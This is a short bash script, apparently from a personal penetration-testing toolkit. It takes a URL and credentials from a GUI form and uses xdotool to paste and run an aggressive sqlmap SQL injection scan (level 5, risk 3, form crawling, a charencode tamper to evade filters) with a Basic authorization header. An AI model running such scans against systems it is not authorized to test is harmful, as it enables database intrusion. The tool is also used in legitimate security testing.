#!/bin/bash

: '
sqlmap: perform Authorization: Basic attack
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "URL" "Username" "Password"

URL=${form_data["URL"]}
USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}

BASIC_BASE64=$(echo -n "${USERNAME}:${PASSWORD}" | base64)

paste_command "sqlmap -u '${URL}' --form --batch --level 5 --risk 3 --headers=\"Authorization: Basic ${BASIC_BASE64}\" --tamper=charencode"
xdotool key Return
